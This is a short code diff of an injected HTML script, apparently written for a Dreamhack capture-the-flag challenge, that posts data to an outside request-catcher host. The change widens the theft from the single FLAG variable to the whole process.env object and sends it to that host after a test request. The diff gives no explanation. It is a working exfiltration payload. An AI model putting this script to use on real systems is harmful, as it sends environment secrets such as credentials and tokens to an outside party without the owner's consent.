@@ -1,10 +1,11 @@
 <script>
-    const flag = process.env.FLAG;
-    let req1 = new XMLHttpRequest();
-    req1.open("POST", "https://eprmoar.request.dreamhack.games");
-    req1.send(flag)
+    const flag = process.env;
 
     let req = new XMLHttpRequest();
     req.open("POST", "https://eprmoar.request.dreamhack.games");
-    req.send("A")
+    req.send("A");
+    
+    let req1 = new XMLHttpRequest();
+    req1.open("POST", "https://eprmoar.request.dreamhack.games");
+    req1.send(flag);
 </script>
